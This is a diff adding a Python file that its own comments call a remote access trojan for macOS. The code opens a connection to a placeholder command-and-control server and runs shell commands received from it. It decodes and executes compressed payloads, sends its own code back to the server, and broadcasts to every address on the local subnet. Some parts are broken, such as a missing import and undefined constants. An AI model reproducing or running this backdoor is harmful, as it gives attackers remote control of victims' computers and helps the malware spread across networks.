@@ -1,0 +1,97 @@
+import base64
+import os
+import socket
+import subprocess
+import sys
+import zlib
+import random
+import struct
+import time
+
+# Attribution information
+__author__ = 'GiFXED'
+__version__ = '2.0'
+
+# The following code is a remote access trojan created by GiFXED
+# It is designed to work on Mac operating systems
+
+def backdoor():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect(('C2_SERVER_IP', C2_SERVER_PORT))
+            s.send(b'[+] Connection established\n')
+        except:
+            continue
+        data = s.recv(1024)
+        if data.startswith(b'cd'):
+            os.chdir(data[3:].rstrip())
+        elif data.startswith(b'exit'):
+            s.close()
+            break
+        elif data.startswith(b'shell '):
+            command = data[6:].rstrip()
+            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output = proc.stdout.read() + proc.stderr.read()
+            s.send(output)
+        else:
+            try:
+                data = base64.b64decode(data)
+                data = zlib.decompress(data)
+                # Run
+                if sys.platform.startswith('darwin'):
+                    filename = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8)) + '.sh'
+                    with open(filename, 'w') as f:
+                        f.write(data)
+                    os.chmod(filename, 0o755)
+                    proc = subprocess.Popen('./' + filename, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output = proc.stdout.read() + proc.stderr.read()
+                    output = zlib.compress(output)
+                    output = base64.b64encode(output)
+                    s.send(output)
+                    os.remove(filename)
+                    
+                    # Send copy
+                    with open(sys.argv[0], 'rb') as f:
+                        malware_data = f.read()
+                    s.sendall(malware_data)
+            except:
+                pass
+
+def generate_tag():
+    tag = ''
+    for i in range(8):
+        tag += chr(random.randint(97,122))
+    return tag
+
+def generate_ip_list():
+    ip_list = []
+    ip_prefix = '.'.join(socket.gethostbyname_ex(socket.gethostname())[2][0].split('.')[:3])
+    for i in range(1, 255):
+        ip = ip_prefix + '.' + str(i)
+        if ip != socket.gethostbyname(socket.gethostname()):
+            ip_list.append(ip)
+    return ip_list
+
+def send_broadcast():
+    while True:
+        for ip in generate_ip_list():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+                s.sendto(struct.pack('!I', MAGIC_NUMBER), (ip, BROADCAST_PORT))
+            except:
+                pass
+        time.sleep(BROADCAST_INTERVAL)
+
+MAGIC_NUMBER = 0x12345678
+BROADCAST_PORT = 50000
+BROADCAST_INTERVAL = 60 * 5
+
+__author__ += ' [{}]'.format(generate_tag())
+
+print("  0_  \n / //\\ \n| |/|/ |   H4x0r MALW4R3 \n|  /_|\\| \n|_/   \\_\n")
+print('[+] running...')
+
+backdoor()
